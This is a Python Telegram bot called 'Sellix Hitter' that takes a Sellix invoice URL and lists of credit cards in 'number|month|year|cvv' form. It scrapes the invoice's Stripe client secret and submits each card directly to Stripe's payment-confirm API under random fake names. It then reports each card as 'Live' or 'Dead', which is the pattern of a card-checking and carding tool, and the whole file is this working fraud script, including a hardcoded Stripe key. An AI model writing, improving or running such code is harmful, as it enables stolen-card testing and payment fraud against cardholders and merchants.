import requests
import telebot
import random
import re
from keep_alive import keep_alive

keep_alive()

# Disable urllib3 warnings
import urllib3
urllib3.disable_warnings()

bot_token = "Bot_Token"
bot = telebot.TeleBot(bot_token)

user_data = {}  

def extract_invoice_info(url):
    match = re.match(r'https?://([a-zA-Z0-9.-]+)/(?:[a-zA-Z0-9.-]+/)?invoice/([^/]+)', url)
    if match:
        groups = match.groups()
        return {
            'domain': groups[0], 
            'invoice_id': groups[1]
        }
    else:
        return {
            "error": "Error: Invalid Sellix Invoice URL."
        }

def sellix_info(url):
    url_info = extract_invoice_info(url)

    if url_info.get("error"):
        return url_info
    invoice_id = url_info["invoice_id"]
    domain = url_info["domain"]

    url = f"https://{domain}/api/shop/invoices/{invoice_id}"

    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
    }
    try:
        r = requests.get(url, headers=headers, verify=False)

        if r.status_code != 200:
            return {
                "error": f"Error Code: {r.status_code}"
            }
        if r.json().get("error"):
            return {
                "error": r.json()["error"]
            }
        info = r.json()["data"]["invoice"]
        data = {
            "domain": domain,
            "invoice_id": invoice_id,
            "email": info.get("customer_email"),
            "pi": info.get("stripe_client_secret"),
            "pk": "pk_live_51JpGudGGvSAAHahB4rQbESNBf5Lm7bUOBLfpzqbithD4MTr9zhWN1SUx134s7MLODCj11W7Y1S7mqrT8iUjdoPah00gksKbsKb" if info.get("stripe_publishable_key") in [None, ""] else info.get("stripe_publishable_key"),
            "acc_id": info.get("stripe_user_id")
        }
        return data
    except Exception as e:
        return {
            "error": f"Error: {str(e)}"
        }

def random_info():
    f = ["Johnny", "Jake", "Himanshu", "Justin", "Robert"]
    l = ["Downy", "Sins", "Smith", "Williamson"]
    return {
        "first_name": random.choice(f),
        "last_name": random.choice(l)
    }

def pay_sellix(url, ccn, mon, year):
    sellix_in = sellix_info(url)
    if sellix_in.get("error"):
        return {
            "error": sellix_in["error"]
        }
    domain = sellix_in["domain"]
    invoice_id = sellix_in["invoice_id"]
    pi_id = "pi_"+sellix_in["pi"].split("_")[1]
    cs_id = "secret_"+sellix_in["pi"].split("_")[3]
    acc_id = sellix_in["acc_id"]
    pk = sellix_in["pk"]
    email = sellix_in["email"]

    rn_info = random_info()
    first_name = rn_info["first_name"]
    last_name = rn_info["last_name"]

    url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "referer": "https://js.stripe.com/",
    }
    data = f"return_url=https%3A%2F%2F{domain}%2Finvoice%2F{invoice_id}&payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][exp_year]={year}&payment_method_data[card][exp_month]={mon}&payment_method_data[billing_details][address][country]=IN&payment_method_data[payment_user_agent]=stripe.js%2Fefee6eb491%3B+stripe-js-v3%2Fefee6eb491%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2F{domain}&payment_method_data[time_on_page]=10585&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&_stripe_account={acc_id}&client_secret={pi_id}_{cs_id}"
    try:
        r = requests.post(url, headers=headers, data=data, verify=False)

        if r.status_code == 200 and r.json().get("status") == "succeeded":
            return True
        elif r.json().get("error"):
            if r.json()["error"]["type"] == "invalid_request_error":
                return {
                    "error": "Error: Expired Invoice."
                }
            else:
                return {
                    "error": f"Error: {r.json()['error']['message']}"
                }

        elif r.status_code == 200 and r.json().get("status") == "requires_action":
            three_d_secure_2_source = r.json()["next_action"]["use_stripe_sdk"]["three_d_secure_2_source"]
        elif r.status_code != 200:
            return {
                "error": f"Error: {r.json()['error']['message']}"
            }
        else:
            return {
                "error": f"Error: {r.json().get('status')}"
            }
    except Exception as e:
        return {
            "error": f"Error: {str(e)}"
        }

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Welcome to the Sellix AutoCo! Please enter your Sellix invoice URL.")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def get_invoice_url(message):
    sellix_url = message.text
    user_data[message.chat.id] = {'sellix_url': sellix_url}
    bot.reply_to(message, "Thanks! Now, please enter your credit card information")

@bot.message_handler(func=lambda message: not message.text.startswith('http') and '|' in message.text)
def sellix_payment(message):
    chat_id = message.chat.id

    if chat_id not in user_data or 'sellix_url' not in user_data[chat_id]:
        bot.reply_to(message, "Please start by entering your Sellix invoice URL.")
        return

    sellix_url = user_data[chat_id]['sellix_url']
    cc_set = message.text.strip().split('|')

    if len(cc_set) != 4:
        bot.reply_to(message, "⊙ Status: Dead ❌\n⊙ Response: Error: Invalid credit card information format.")
        return

    ccn, mon, year, _ = cc_set

    try:
        result = pay_sellix(sellix_url, ccn, mon, year)

        if isinstance(result, bool) and result:
            bot.reply_to(message, f"┏━━━━━━━⍟\n┃  Sellix Hitter\n┗━━━━━━━━━━━⊛\n\n⊙ CC: {ccn}|{mon}|{year}|\n⊙ Status: Live ✔️\n⊙ Response: Success: Payment succeeded with card {ccn}")
        elif isinstance(result, dict) and 'error' in result:
            bot.reply_to(message, f"┏━━━━━━━⍟\n┃  Sellix Hitter\n┗━━━━━━━━━━━⊛\n\n⊙ CC: {ccn}|{mon}|{year}|\n⊙ Status: Dead ❌\n⊙ Response: Failure: Payment failed with card {ccn}: {result['error']}")
        else:
            bot.reply_to(message, f"┏━━━━━━━⍟\n┃  Sellix Hitter\n┗━━━━━━━━━━━⊛\n\n⊙ CC: {ccn}|{mon}|{year}|\n⊙ Status: Dead ❌\n⊙ Response: Unexpected result with card {ccn}: {result}")

    except Exception as e:
        bot.reply_to(message, f"┏━━━━━━━⍟\n┃  Sellix Hitter\n┗━━━━━━━━━━━⊛\n\n⊙ CC: {ccn}|{mon}|{year}|\n⊙ Status: Dead ❌\n⊙ Response: Error: An unexpected error occurred for card {ccn}: {e}")

    # Clear user data after the payment attempt
    del user_data[chat_id]


if __name__ == '__main__':
    bot.polling()

 
